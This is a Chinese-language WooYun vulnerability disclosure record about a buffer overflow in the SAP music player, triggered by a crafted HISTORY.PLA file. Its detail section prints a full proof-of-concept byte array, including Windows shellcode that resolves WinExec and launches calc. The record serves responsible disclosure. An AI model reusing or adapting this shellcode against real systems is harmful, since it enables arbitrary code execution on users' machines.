{"id": 14706, "wybug_id": "wooyun-2012-016450", "wybug_title": "SAP缓冲区溢出执行任意代码漏洞", "wybug_corp": "SAP音乐播放软件", "wybug_author": "cssembly", "wybug_date": "2012-12-24 20:49", "wybug_open_date": "2013-02-07 20:50", "wybug_type": "远程代码执行", "wybug_level": "低", "wybug_rank_0": "4", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["缓冲区溢出"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-12-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-12-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-01-01：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-02-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-03-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-03-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-02-07：\t细节向公众公开  简要描述： SAP是一个播放器，启动时对HISTORY.PLA的内容未进行验证，导致缓冲区溢出执行任意代码。 详细说明：  SAP是一个播放器，启动时对HISTORY.PLA的内容未进行验证，导致缓冲区溢出执行任意代码。将文件内容修改为如下内容，触发漏洞。poc如下：    0x41, 0x41, 0x41, 0x41, 0x7E, 0x46, 0x41, 0x41,    0x41, 0x7E, 0x4B, 0x41, 0x41, 0x41, 0x7E, 0x50,    0x41, 0x41, 0x41, 0x7E, 0x55, 0x41, 0x41, 0x41,    0x7E, 0x5A, 0x41, 0x41, 0x41, 0x20, 0x7E, 0x35,    0x41, 0x41, 0x41, 0x7E, 0x30, 0x41, 0x41, 0x41,    0x7E, 0x25, 0x41, 0x41, 0x41, 0x7E, 0x29, 0x41,    0x41, 0x41, 0x7E, 0x43, 0x42, 0x41, 0x41, 0x7E,    0x48, 0x42, 0x41, 0x41, 0x7E, 0x4D, 0x42, 0x41,    0x41, 0x7E, 0x52, 0x42, 0x41, 0x41, 0x7E, 0x57,    0x42, 0x41, 0x41, 0x7E, 0x32, 0x42, 0x41, 0x41,    0x7E, 0x37, 0x42, 0x41, 0x41, 0x7E, 0x40, 0x42,    0x41, 0x41, 0x7E, 0x26, 0x42, 0x41, 0x41, 0x7E,    0x2B, 0x42, 0x41, 0x41, 0x7E, 0x45, 0x43, 0x41,    0x41, 0x7E, 0x4A, 0x43, 0x41, 0x41, 0x7E, 0x4F,    0x43, 0x41, 0x41, 0x7E, 0x54, 0x43, 0x41, 0x41,    0x7E, 0x59, 0x43, 0x41, 0x41, 0x7E, 0x34, 0x43,    0x41, 0x41, 0x7E, 0x39, 0x43, 0x41, 0x41, 0x7E,    0x24, 0x43, 0x41, 0x41, 0x7E, 0x28, 0x43, 0x41,    0x41, 0x7E, 0x42, 0x44, 0x41, 0x41, 0x7E, 0x47,    0x44, 0x41, 0x41, 0x7E, 0x4C, 0x44, 0x41, 0x41,    0x7E, 0x51, 0x44, 0x41, 0x41, 0x7E, 0x56, 0x44,    0x41, 0x41, 0x7E, 0x31, 0x44, 0x41, 0x41, 0x7E,    0x36, 0x44, 0x41, 0x41, 0x7E, 0x21, 0x44, 0x41,    0x41, 0x7E, 0x5E, 0x44, 0x41, 0x41, 0x7E, 0x5F,    0x44, 0x41, 0x41, 0x7E, 0x44, 0x45, 0x41, 0x41,    0x7E, 0x49, 0x45, 0x41, 0x41, 0x7E, 0x4E, 0x45,    0x41, 0x41, 0x7E, 0x53, 0x45, 0x41, 0x41, 0x7E,    0x58, 0x45, 0x41, 0x41, 0x7E, 0x33, 0x45, 0x41,    0x41, 0x7E, 0x38, 0x45, 0x41, 0x41, 0x7E, 0x23,    0x45, 0x41, 0x41, 0x7E, 0x2A, 0x45, 0x41, 0x41,    0x7E, 0x41, 0x46, 0x41, 0x41, 0x7E, 0x46, 0x46,    0x41, 0x41, 0x7E, 0x4B, 0x46, 0x41, 0x41, 0x7E,    0x50, 0x46, 0x41, 0x41, 0x7E, 0x55, 0x46, 0x41,    0x41, 0x7E, 0x5A, 0x46, 0x41, 0x41, 0x7E, 0x35,    0x46, 0x41, 0x41, 0x7E, 0x30, 0x46, 0x41, 0x41,    0x7E, 0x25, 0x46, 0x41, 0x29, 0x46, 0x12, 0x45,    0xFA, 0x7F, 0x31, 0xD2, 0x52, 0x68, 0x63, 0x61,    0x6C, 0x63, 0x89, 0xE6, 0x52, 0x56, 0x64, 0x8B,    0x72, 0x30, 0x8B, 0x76, 0x0C, 0x8B, 0x76, 0x0C,    0xAD, 0x8B, 0x30, 0x8B, 0x7E, 0x18, 0x8B, 0x5F,    0x3C, 0x8B, 0x5C, 0x1F, 0x78, 0x8B, 0x74, 0x1F,    0x20, 0x01, 0xFE, 0x8B, 0x4C, 0x1F, 0x24, 0x01,    0xF9, 0x42, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69,    0x6E, 0x45, 0x75, 0xF5, 0x0F, 0xB7, 0x54, 0x51,    0xFE, 0x8B, 0x74, 0x1F, 0x1C, 0x01, 0xFE, 0x03,    0x3C, 0x96, 0xFF, 0xD7, 0xCC, 0x20    漏洞证明：  移除文件正常执行\n\n将HISTORY.PLA拖入可执行程序目录，运行，弹出calc\n\n\n\n   修复方案：     版权声明：转载请注明来源 cssembly@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2012-12-29 11:38 厂商回复： CNVD确认并复现所述情况，已转由CNVD直接联系厂商进行处置。综合rank=10 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-12-25 09:29 |    \t\tzmx \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:9        | wooyun)\t\t \n  晕，我还以为是sap公司的ERP软件呢    \n     2012-12-27 09:43 |    \t\t快乐购物股份有限公司(乌云厂商)\t\t \n  我也以为是ERP软件    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}